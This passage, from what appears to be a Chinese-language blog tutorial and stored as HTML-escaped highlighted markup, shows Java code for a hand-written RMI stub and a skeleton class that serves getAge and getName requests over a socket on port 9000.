punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;age&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt; inStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; inStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// pass method name to skeleton&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt; outStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt; inStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;inStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;skeleton的实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#skeleton的实现&#34;&gt;#&lt;/a&gt; Skeleton 的实现&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;net&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token import&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;java&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;net&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ServerSocket&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Skeleton&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Thread&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt; myServer&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Skeleton&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt; server&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// get reference of object server&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;myServer &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; server&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;// new socket at port 9000&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;ServerSocket&lt;/span&gt; serverSocket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ServerSocket&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;// accept stub&#39;s request&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;Socket&lt;/span&gt; socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; serverSocket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token comment&#34;&gt;// get stub&#39;s request&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt; inStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; method &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;inStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token comment&#34;&gt;// check method name&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;method&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;age&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token comment&#34;&gt;// execute object server&#39;s business method&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; myServer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt; outStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token comment&#34;&gt;// return result to stub&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;method&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token comment&#34;&gt;// execute object server&#39;s business method&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; myServer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt; outStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token comment&#34;&gt;// return result to stub&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token 